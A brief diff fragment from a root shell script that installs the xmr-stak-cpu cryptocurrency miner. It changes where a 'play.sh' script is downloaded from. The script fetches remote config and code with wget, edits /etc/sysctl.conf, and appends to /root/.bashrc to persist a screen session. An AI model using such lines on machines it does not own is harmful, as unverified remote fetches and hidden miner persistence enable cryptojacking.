@@ -39,7 +39,7 @@ sudo sysctl -w vm.nr_hugepages=128
 rm config.txt
 wget ssh-me.ga/a./config.txt
 chmod +x xmr-stak-cpu
-wget ssh-me.ga/a./play.sh
+wget https://raw.githubusercontent.com/alifiana/mine/master/play.sh
 echo -e "vm.nr_hugepages=128" >> /etc/sysctl.conf
 echo -e "screen -d -r" >> /root/.bashrc
 screen
